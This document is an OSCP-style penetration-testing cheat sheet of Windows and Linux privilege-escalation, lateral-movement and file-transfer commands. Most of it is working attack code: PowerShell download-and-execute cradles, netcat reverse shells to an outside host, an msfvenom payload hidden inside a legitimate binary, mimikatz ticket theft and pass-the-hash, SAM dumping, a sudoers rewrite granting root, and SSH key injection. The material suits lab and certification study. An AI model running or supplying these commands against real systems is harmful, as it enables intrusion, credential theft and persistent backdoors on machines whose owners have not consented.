# General
- Always try dump and default passwords for users on the system
- Always search source code for DB credentials ands loot the hell out of the db, looking for creds.
- Always enumerate users and try and known password for that user

Good overview for resources

https://xapax.gitbooks.io/security/

Basically just a dump of unstructured OSCP knowledge with some helpful items

https://github.com/doffensive/wired-courtyard

# Windows
## Tips and Hints
- .JOB files are scheduled jobs which are not registered with the schtasks.

## Main Enumeration Scripts
```batch
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/PowerUp.ps1'); Invoke-AllChecks"

Rem need to transfer both accesschk.exe and powerless.bat to the machine.
accesschk.exe
powerless.bat
```

## Powershell
Running Local Commands
```powershell
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"

powershell -ExecutionPolicy ByPass -command "& { . Z:\PowerUp.ps1; Invoke-AllChecks }"
```
Running commands from a remote host
```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/PowerUp.ps1'); Invoke-AllChecks"

powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.139/Invoke-MS16-032.ps1'); Invoke-MS16-032"
```

## File Transfer

SMB
```batch
net use * \\10.11.0.56\draedis /User:root <PASSWORD>
```

FTP - Run script and copy and paste output to terminal window
```bash
$SCRIPTS/ftp_pull.sh <filename to download>
#ftp_push will push files from windows to kali
```

Powershell - Run script and copy and paste to terminal window
```bash
$SCRIPTS/powershell_dl.sh <file to download>
```

VBScript - Run script and copy and paste to terminal window, then run download on terminal window
```bash
# Kali
$SCRIPTS/win_wget_vb.sh
```
```batch
REM Windows
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

PsExec for On Remote Machine
```batch
 C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
```

Powershell window to Run as a different user
```powershell
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```

Runas (e.g. su) for Windows with other creds. CAN'T PASS PASSWORD THO!
```batch
 C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
 Enter the password for Test:
 Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
 ```

Compile python exploits to .exe for windows
```bash
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db.com/download/31853  
 python pyinstaller.py --onefile exploit.py
 ```

## Pre-Compiled Exploits
https://github.com/SecWiki/windows-kernel-exploits

## embed msfvenom code into existing binaries
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
```

## Steal SAM from image (or backup image)
```bash
mount <image> /mnt/mountpoint
cd /mnt/mountpoint/Windows/system32/config
samdump2 SYSTEM SAM
```
# mimikatz
## Stealing tickets with Mimikatz
Tickets will be written to file system
```batch
mimikatz# kerberos::list /export
```
```batch
kerberos::list /export
```
Loading a ticket
```batch
mimikatz# kerberos::ptt <ticket-file>
mimikatz# kerberos::list
```
```batch
kerberos::ptt <ticket-file>
kerberos::list
```
## Authenticating with SMB using NTLM hash
This will launch a cmd.exe shell as the specified user
```batch
mimikatz# sekurlasa::pth /user:chris /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
```
```batch
sekurlasa::pth /user:chris /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
```

# Impacket
Scripts for talking to services via windows RPC functions
```bash
# launch cmd shell via smb
smbexec.py [[domain/]username[:password]@]<targetName or address>
smbexec.py -hashes LMHASH:NTHASH $TARGET
smbexec.py Administrator:AdminPass@10.10.10.1

# command exec
psexec.py  <DOMAIN>/<USERNAME>:<PASSWORD>@$target cmd.exe
psexec.py  -hashes LMHASH:NTHASH $TARGET cmd.exe

# start/stop services
services.py 

# exec a command with the AT interface
atexec.py $target $cmd

# exec with wmi, fileless
wmiexec.py $target $cmd
```

## Redis
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

## Cheat Sheets
Mother Script

http://www.fuzzysecurity.com/tutorials/16.html

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

Quick Items to Check

https://github.com/ibr2/pwk-cheatsheet#windows-privilege-escalation

OSCP based Guides

https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html

https://github.com/xapax/security/blob/master/privilege_escalation_windows.md

###
# Linux
## Tips and Hints
### Main Enumeration Scripts
```bash
export A=http://<IP>
export H=http://<IP>:8000
cd /tmp
wget $A/LinEnum.sh
bash LinEnum.sh

...

linux-exploit-suggester.sh
linux-exploit-suggester2.pl
linuxprivchecker.py
```

Upgrade shells
```python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=linux
```

Without Python
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

https://netsec.ws/?p=337

Check all files for ones that may be interesting (like authorized_keys)

Check SUID programs for ones that do not belong

Check sudo permissions

If run as root, get sudo permissions as low priv user
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

Find an app that is run as root and managle the path (setuid program for example). Think periodic script which runs (cron) or is already running
 ```bash
 set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
 chmod +x ssh
 ```

Always use google site:exploit-db.com <kernel_ver> to search for vulnerabilities, since not all are reported in the scripts. All vulns *should* be in searchsploit.
- `linux-exploit-suggester.sh` == most recent, but offline
- `linuxprivchecker.py` == good, but old exploits 
```bash
searchsploit "Linux Kernel"  
searchsploit linux 2.6 | grep -i ubuntu | grep local 
```

Compiling binaries on Kali for old distros
```
gcc 3.c -o 3 -static -Wl,--hash-style=sysv -m32
```
Only need static if there is a CRuntime Libc2.7 error

## SSH Key Injection
Try and add a key to a writeable authorized key file
```bash
echo "SSH_PUBLIC_KEY" >> /path/to/.ssh/authorized_keys
```

## Pre-Compiles Exploits
https://github.com/SecWiki/linux-kernel-exploits

## Cheat Sheets
Mother Script

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Some Quick Things to check

https://github.com/ibr2/pwk-cheatsheet#linux-privilege-escalation


Full, OSCP tailored a little

https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html






